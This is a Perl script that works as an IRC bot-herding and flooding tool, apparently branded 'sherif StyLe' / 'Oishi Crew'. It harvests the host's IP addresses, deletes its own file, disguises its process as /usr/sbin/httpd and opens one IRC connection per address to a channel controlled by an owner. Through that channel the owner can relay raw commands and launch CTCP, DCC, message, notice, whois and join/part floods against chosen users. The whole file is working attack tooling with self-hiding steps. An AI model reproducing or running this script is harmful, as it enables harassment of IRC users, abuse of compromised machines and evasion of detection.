#!/usr/bin/perl

######################
my $server = $ARGV[0];
my $port="6667";
my $channel="#oishi";
my $owner= "sherif";
my $procname="/usr/sbin/httpd";
######################

my @nickname = ("Abdulrazak","Ackerman","Adams","Addison","Adelstein","Adibe","Adorno","Ahlers","Alavi","Alcorn","Alda",
"Aleks","Allison","Alongi","Altavilla","Altenberger","Altenhofen","Amaral","Amatangelo","Ameer","Amsden","Anand","Andel",
"Andos","Andrelus","Andron","Anfinrud","Ansley","Anthony","Antos","Arbia","Arduini","Arellano","Aristotle","Arjas","Arky","Atkins",
"Augustus","Aurelius","Axelrod","Axworthy","Ayiemba","Aykroyd","Ayling","Azima","Bachmuth","Backus","Bady","Baglivo","Bagnold",
"Bailar","Bakanowsky","Baleja","Ballatori","Ballew","Baltz","Banta","Barabesi","Barajas","Baranczak","Baranowska","Barberi","Barbetti",
"Barneson","Barnett","Barriola","Barry","Bartholomew","Bartolome","Bartoo","Basavappa","Bashevis","Batchelder","Baumiller","Bayles","Bayo",
"Beacon","Beal","Bean","Beckman","Beder","Bedford","Behenna","Belanger","Belaoussof","Belfer","Belin-Collart","Bellavance","Bellhouse",
"Bellini","Belloc","Benedict-Dye","Bergson","Berke-Jenkins","Bernardo","Bernassola","Bernston","Berrizbeitia","Betti","Beynart","Biagioli",
"Bickel","Binion","Bir","Bisema","Bisho","Blackbourn","Blackwell","Blagg","Blakemore","Blanke","Bliss","Blizard","Bloch","Bloembergen",
"Bloemhof","Bloxham","Blyth","Bolger","Bolick","Bollinger","Bologna","Boner","Bonham","Boniface","Bontempo","Bookss","Bookbinder","Boone",
"Boorstin","Borack","Borden","Bossi","Bothman","Botosh","Boudin","Boudrot","Bourneuf","Bowers","Boxer","Boyajian","Boyes","Boyland",
"Boym","Boyne","Bracalente","Bradac","Bradach","Brecht","Breed","Brenan","Brennan","Brewer","Brewer","Bridgeman","Bridges","Brinton",
"Britz","Broca","Brook","Brzycki","Buchan","Budding","Bullard","Bunton","Burden","Burdzy","Burke","Burridge","Busetta","Byatt","Byerly",
"Byrd","Cage","Calnan","Cammelli","Cammilleri","Canley","Capanni","Caperton","Capocaccia","Capodilupo","Cappuccio","Capursi","Caratozzolo",
"Carayannopoulos","Carlin","Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Caspar","Castelda","Cavanagh",
"Cavell","Ceniceros","Cerioli","Chapman","Charles","Cheang","Cherry","Chervinsky","Chiassino","Chien","Childress","Childs","Chinipardaz",
"Chinman","Christenson","Christian","Christiano","Christie","Christopher","Chu","Chupasko","Church","Ciampaglia","Cicero","Cifarelli",
"Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton",
"Comstock","Concino","Condodina","Connors","Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen",
"Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapice","D'arcangelo","Das",
"Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon",
"Delger","Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio",
"Difronzo","Dilworth","Dionysius","Dirksen","Dockery","Doherty","Donahue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland",
"Drinker","D'souza","Duffin","Durrett","Dussault","Dwyer","Eardley","Ebeling","Eckel","Edley","Edner","Edward","Eickenhorst","Eliasson",
"Elmendorf","Elmerick","Elvis","Encinas","Enyeart","Eppling","Erbach","Erdman","Erdos","Erez","Espinoza","Estes","Etter","Euripides",
"Everett","Fabbris","Fagan","Faioes","Falco-Acosta","Falorsi","Faris","Farone","Farren","Fasso'","Fates","Feigenbaum","Fejzo","Feldman",
"Fernald","Fernandes","Ferrante","Ferriell","Feuer","Fido","Field","Fink","Finkelstein","Finnegan","Fiorina","Fisk","Fitzmaurice","Flier",
"Flores","Folks","Forester","Fortes","Fortier","Fossey","Fossi","Francisco","Franklin-Kenea","Franz","Frazier-Davis","Freid","Freundlich",
"Fried","Friedland","Frisken","Frowiss","Fryberger","Frye","Fujii-Abe","Fuller","Furth","Fusaro","Gabrielli","Gaggiotti","Galeotti","Galwey",
"Gambini","Garfield","Garman","Garonna","Geller","Gemberling","Georgi","Gerrett","Ghorai","Gibbens","Gibson","Gilbert","Gili","Gill","Gillispie",
"Gist","Gleason","Glegg","Glendon","Goldfarb","Goncalves","Good","Goodearl","Goody","Gozzi","Gravell","Greenberg","Greenfeld","Griffiths",
"Grigoletto","Grummell","Gruner","Gruppe","Guenthart","Gunn","Guo","Ha","Haar","Hackman","Hackshaw","Haley","Halkias","Hallowell","Halpert",
"Hambarzumjan","Hamer","Hammerness","Hand","Hanssen","Harding","Hargraves","Harlow","Harrigan","Hartman","Hartmann","Hartnett","Harwell",
"Haviaras","Hawkes","Hayes","Haynes","Hazlewood","Heermans","Heft","Heiland","Hellman","Hellmiss","Helprin","Hemphill","Henery","Henrichs",
"Hernandez","Herrera","Hester","Heubert","Heyeck","Himmelfarb","Hind","Hirst","Hitchcock","Hoang","Hock","Hoffer","Hoffman","Hokanson","Hokoda",
"Holmes","Holoien","Holter","Holway","Holzman","Hooker","Hopkins","Horsley","Hoshida","Hostage","Hottle","Howard","Hoy","Huey","Huidekoper",
"Hungerford","Huntington","Hupp","Hurtubise","Hutchings","Hyde","Iaquinta","Ichikawa","Igarashi","Inamura","Inniss","Isaac","Isaievych","Isbill",
"Isserman","Iyer","Jacenko","Jackson","Jagers","Jagger","Jagoe","Jain","Jamil","Janjigian","Jarnagin","Jarrell","clarass","Jeffers","Jellis",
"Jenkins","Jespersen","Jewett","Johannesson","Johannsen","Johns","Jolly","Jorgensen","Jucks","Juliano","Julious","Kabbash","Kaboolian","Kafadar",
"Kalbfleisch","Kaligian","Kalil","Kalinowski","Kalman","Kamel","Kangis","Karpouzes","Kassower","Kasten","Kawachi","Kee","Keenan","Keepper",
"Keith","Kelker","Kelsey","Kempton","Kemsley","Kendall","Kerry","Keul","Khong","Kimmel","Kimmett","Kimura","Kindall","Kinsley","Kippenberger",
"Kirscht","Kittridge","Kleckner","Kleiman","Kleinfelder","Klemperer","Kling","Klinkenborg","Klint","Knuff","Kobrick","Koch","Kohn","Koivumaki",
"Kommer","Koniaris","Konrad","Kool","Korzybski","Kotter","Kovaks","Kraemer","Krailo","Krasney","Kraus","Kroemer","Krysiak","Kuenzli","Kumar",
"Kusman","Kuwabara","La","Labunka","Lafler","Laing","Lallemant","Landes","Lankes","Lantieri","Lanzit","Laserna","Lashley","Lawless","Lecar",
"Lecce","Leclercq","Leite","Lenard","Sofia","Lesser","Lessi","Liakos","Lidano","Liem","Light","Lightfoot","Lim","Linares","Linda","Linder",
"Linea","Linehan","Linzee","Lippmann","Lipponen","Little","Litvak","Livernash","Livi","Livolsi","Lizardo","Locatelli","Longworth","Loss","Loveman",
"Lowenstein","Loza","Lubin","Lucas","Luciano","Luczkow","Luecke","Lunetta","Luoma","Lussier","Lutcavage","Luzader","Ma","Maccormac","Macdonald",
"Maceachern","Macintyre","Mackenney","MacMillan","Macy","Madigan","Maggio","Mahony","Maier","Maine-Hershey","Maisano","Malatesta","Maller",
"Malova","Manalis","Mandel","Manganiello","Mantovan","March","Marchbanks","Marcus","Margalit","Margetts","Marques","Martinez","Martochio",
"Marton","Marubini","Mass","Matalka","Matarazzo","Matsukata","Mattson","Mauzy","May","Mazzali","Mazziotta","Mcbride","Mccaffery","Mccall",
"Mcclearn","Mcdowell","Mcelroy","McFadden","Mcghee","Mcgoldrick","McIlroy","Mcintosh","Mcdonald","Mclane","Mclaren","Mcnealy","Mcnulty",
"Meccariello","Memisoglu","Menzies","Merikoski","Merlani","Merminod","Merseth","Merz","Metelka","Metropolis","Meurer","Michelman","Middle",
"Mieher","Mills","Minh","Mini","Minichiello","Gonzalez","Mitropoulos","Mittal","Mocroft","Modestino","Moeller","Mohr","Moiamedi","Monque","Montilio",
"MooreDeCh.","Morani","Moreton","Morrison","Morrow","Mortimer","Mosher","Mosler","Mostafavi","Motooka","Mudarri","Muello","Mugnai","Mulkern",
"Mulroy","Mumford","Mussachio","Naddeo","Napolitano","Nardi","Nardone","Naviaux","Nayduch","Nelson","Nenna","Nesci","Neuman","Newfeld","Newlin",
"Ng","Ni","Nickerson","Nickoloff","Nisenson","Nitabach","Notman","Nuzum","Ocougne","Ogata","Oh","O'hagan","Oldford","Olsen","Olson","Olszewski",
"O'malley","Oman","O'meara","Opel","Oray","Orfield","Orsi","Ospina","Ostrowski","Ottaviani","Otten","Ouchida","Ovid","PaesDealmeida","Paine",
"Palayoor","Palepu","Pallara","Palmitesta","Panadero","Panizzon","Pantilla","Paoletti","Parmeggiani","Parris","Partridge","Pascucci","Patefield",
"Patrick","Pattullo","Pavetti","Pavlon","Pawloski","Paynter","Peabody","Pearlberg","Pederson","Peishel","Penny","Pereira","Perko","Perlak",
"Perlman","Perna","Perone","Perrimon","Peters","Petruzello","Pettibone","Pettit","Pfister","Pilbeam","Pinot","Plancon","Plant","Plasket","Plous",
"Po","Pocobene","Poincaire","Pointer","Poirier","Polak","Polanyi","Politis","Poma","Poolman","Powers","Presper","Preucel","Prevost","Pritchard",
"Pritz","Proietti","Prothrow-Stith","Puccia","Pugh","Pynchon","Quaday","Quetin","Rabe","Rabkin","Radeke","Rajagopalan","Raney","Rangan","Rankin",
"Rapple","Rayport","Redden-Tyler","Reedquist","Cunningham","Reinold","Remak","Renick","Repetto","Resnik","Rhea","Richmond","Rielly","Rindos",
"Rineer","Rish","Rivera","Robinson","Rocha","Roesler","Rogers","Ronen","Row","Royal","Ru","Ruan","Ruderman","Ruescher","Rush","Ryu","Sabatello",
"Sadler","Safire","Sahu","Sali","Samson","Sanchez-Ramirez","Sanna","Sapers","Sarin","Sartore","Sase","Satin","Satta","Satterthwaite","Sawtell",
"Sayied","Scarponi","Scepan","Scharf","Scharlemann","Scheiner","Schiano","Schifini","Schilling","Schmitt","Schossberger","Schuman","Schutte",
"Schuyler","Schwan","Schwickrath","Scovel","Scudder","Seaton","Seeber","Segal","Sekler","Selvage","Sen","Sennett","Seterdahl","Sexton",
"Seyfert","Shaikh","Shakis","Shankland","Shanley","Shar","Shatrov","Shavelson","Shea","Sheats","Shepherd","Sheppard","Shepstone","Shesko","Shia",
"Shibata","Shimon","Siesto","Sigalot","Sigini","Signa","Silverman","Silvetti","Sinsabaugh","Sirilli","Sites","Skane","Skerry","Skoda","Sloan",
"Slowe","Smilow","Sniffen","Snodgrass","Socolow","Solon","Somers","Sommariva","Sorabella","Sorg","Sottak","Soukup","Soule","Soultanian","Spanier",
"Sparrow","Spaulding","Speizer","Spence","Sperber","Spicer","Spiegelhalter","Spiliotis","Spinrad","StMartin","Stalvey","Stam","Stang","Stassinopolus",
"States","Statlender","Stefani","Steiner","Stephanian","Stepniewska","Stewart-Oaten","Stiepock","Stillwell","Stock","Stockton","Stockwell","Stolzenberg",
"Stonich","Storer","Stott","Strange","Strauch","Streiff","Stringer","Sullivan","Sumner","Suo","Surdam","Sweeting","Sweetser","Swindle","Tagiuri",
"Tai","Talaugon","Tambiah","Tandler","Tanowitz","Tatar","Taveras","Tawn","Tcherepnin","Teague","Temes","Temmer","Tenney","Terracini","Than",
"Thavaneswaran","Theodos","Thibault","Thisted","Thomsen","Throop","Tierney","Till","Timmons","Tofallis","Tollestrup","Tolls","Tolman","Tomford",
"Toomer","Topulos","Torresi","Torske","Towler","Toye","Traebert","Trenga","Trewin","Tringali","Troiani","Troy","Truss","Tsiatis","Tsomides","Tsukurov",
"Tuck","Tudge","Tukan","Turano","Turek","Tuttle","Twells","Tzamarias","Ullman","Untermeyer","Upsdell","Urban","Urdang-Brown","Usdan","Uzuner",
"Vacca","Waite","Valberg","Valencia","Wales","Wallenberg","Walter","vanAllen","VanZwet","Vandenberg","Vanheeckeren","Warshafsky","Wasowska","Vasquez",
"Waugh","Weighart","Weingarten","Weinhaus","Weissbourd","Weissman","Velasquez","Welles","Welsh","Wengret","Venne","Verghese","Wescott","Wetzel",
"Whately","Whilton","White","Whitla","Whittaker","Viana","Viano","Wiedersheim","Wiener","Viens","Vignola","Wilder","Wilhelm","Wilk","Wilkin","Wilkinson",
"Villarreal","Willstatter","Wilson","Vitali","Viviani","Voigt","Wolk","VonHoffman","Woo","Wooden","Woods","Woods-Powell","Vorhaus","Votey","Yacono",
"Yamane","Yanksee","Yarchuk","Yates","Ybarra","Yedidia","Yesson","Yetiv","Yoffe","Yoo","Youk-See","Yu","Zachary","Zahedi","Zangwill","Zegans","Zerbini",
"Zoldak","Zucconi","Zurn","Zwiers");

my @realname  = ("i love you muaaccch");
my @WHO;
my $qqum="*";
$ARGC=@ARGV;
if ($ARGC !=1) {
print "\n+ sherif StyLe\n";
 print "+ Aturan Pakai : perl $0 (server)\n";
 print "+ betulin dulu sekripnya boss..\n\n";
 exit(1);
}
$SIG{CHLD} = sub { wait }; # alterando o signal
my $qtip = qx(/sbin/ifconfig |grep inet | wc -l);
my @ips1 =qx(/sbin/ifconfig |grep \"inet addr\:\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c6\-);
my @ips2 =qx(/sbin/ifconfig \-a |grep \"inet end\.\:\" \|awk \-F \' \' \'\{\print \$3\} \');
my @fbsd =qx(/sbin/ifconfig \|grep \"inet\" \|awk \-F \' \' \'\{\print \$2\} \' \| cut \-c1\-);
@ips = (@ips1, @ips2, @fbsd);
open(ipzitcho,">ips.txt") || die "- ips.txt not found";
          print ipzitcho" @ips";
          close(ipzitcho);
@ips = grep { s/\n$// } @ips;
$rm="rm -rf";
qx($rm $0);
$0 =  $procname  . "\0";
$nick2 = $nick;
print STDOUT "\n+ sherif StyLe\n";
print STDOUT "+ Server : $server\n";
print STDOUT "+ Port   : $port\n";
print STDOUT "+ Owner  : $owner\n";
print STDOUT "+ Channel: $channel\n";
print STDOUT "+ IPs    : $qtip\n\n";
use IO::Socket;
foreach my $FROM (@ips) {
 my $pid = fork(); # gerando um novo processo
  unless ($pid) {   #
my $ident = $nickname[rand scalar @nickname];
my $nick = $nickname[rand scalar @nickname];
my $name = $realname[rand scalar @realname];
$sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
   print $sock "NICK ".$nick."\n";
    print $sock "USER $ident $FROM $server :$name\n";
while (<$sock>) {
        if (/^:.+?\s433\s/) { # nick already in use
            $nick2 = $nickname[rand scalar @nickname];
            print $sock "NICK ".$nick2."\n";
        }
        if (/^:.+?\s376\s/) { # end of motd
            print $sock "JOIN $channel\n";
        }

        if(/^PING :(.*)/){ #replying the ping
            print $sock "PONG :$1\n";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:.oishi (.*)/){
            print $sock "$1";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:.help(.*)/){
            print $sock "PRIVMSG ".$owner." : sherif StyLe\n";
            print $sock "PRIVMSG ".$owner." : Oishi Crew Allnetwork\n";
            print $sock "PRIVMSG ".$owner." : ------------\n";
            print $sock "PRIVMSG ".$owner." : .oishi join #chan\n";
            print $sock "PRIVMSG ".$owner." : .oishi part #chan\n";
            print $sock "PRIVMSG ".$owner." : .msg nick (nick)\n";
            print $sock "PRIVMSG ".$owner." : .quit\n";
            print $sock "PRIVMSG ".$owner." : ------------\n";
            print $sock "PRIVMSG ".$owner." : .ctcpflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .dccflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .noticeflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .msgflood (nick)\n";
            print $sock "PRIVMSG ".$owner." : .hop #chan (pesan)\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.msg(.*)/){
                        print $sock "PRIVMSG ".$1." : ".$2."\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.who(.*)/){
                        print $sock "who ".$channel."\n";
      }
      if (/^:.+?\s+352\s+\S+\s+\S+\s+(.+?)$/) {
                        my $nicks = $1;
                        #$nicks =~ s/\n//;
                        #$nicks =~ s/\r//;
                        push(@WHO, split(/ /, $nicks));
                        print STDOUT "$who[1]\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.dccflood(.*)/){
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :\001DCC CHAT chat 1121485131 1024\001\n";
                        }
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.whoisflood(.*)/){
                        for (1 .. 5) {
                        print $sock "whois ".$1."\n";
                        }
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.hop (.*)/){
                print $sock "JOIN ".$1." : ".$2."\n";
                        for (1 .. 5) {
                        print $sock "PART ".$1." : ".$2."\n";
                        print $sock "JOIN ".$1." : ".$2."\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.ctcpflood(.*)/){
                print $sock "PRIVMSG ".$1." :\001VERSION\001\n";
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :\001VERSION\001\n";
                        print $sock "PRIVMSG ".$1." :\001PING\001\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.msgflood(.*)/){
                        for (1 .. 5) {
                        print $sock "PRIVMSG ".$1." :4toloooooooooooooonnnnnnnggggggggggggggggggggg\n";
                        }
      }
          if(/^\:$owner!.*\@.*PRIVMSG.*:.noticeflood(.*)/){
                        for (1 .. 5) {
                        print $sock "NOTICE ".$1." :4toloooooooooooonnnnnnnnnggggggggggggggggggggggg\n";
                        }
      }
      if(/^ERROR :(.*)/){
                        use IO::Socket;
                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
                        print $sock "NICK ".$nick."\n";
                        print $sock "USER $ident $FROM $server :$name\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.quit(.*)/){
                        die();
      }
      if(/^\:.*: Connection timed out(.*)/){
                        print STDOUT "[~] Connection Timed Out! Retrying!\n";
                        use IO::Socket;
                        $sock=IO::Socket::INET->new(LocalAddr => $FROM, Proto=>"tcp", PeerAddr=> $server, PeerPort=> $port) || exit();
                        print $sock "NICK ".$nick."\n";
                        print $sock "USER $ident $FROM $server :$name\n";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:.stats(.*)/){
                        print $sock "PRIVMSG ".$owner." : Bot Stats\n";
                        print $sock "PRIVMSG ".$owner." : Using server : $server\n";
                        print $sock "PRIVMSG ".$owner." : Using port   : $port\n";
                        print $sock "PRIVMSG ".$owner." : Using nick   : $nick\n";
                        print $sock "PRIVMSG ".$owner." : Using owner  : $owner\n";
                        print $sock "PRIVMSG ".$owner." : Using ident  : $id\n";
                        print $sock "PRIVMSG ".$owner." : oishi StyLe\n\n";
       }
       if( /^\:$owner!.*\@.*\s+PRIVMSG.*:.owner\s+(.*)/ ){
                       $owner =$1;
                       $owner =~ s/ //;
                       $owner =~ s/\r$//;
                       $owner =~ s/\n$//;
       }
   }
exit;
  } 
}
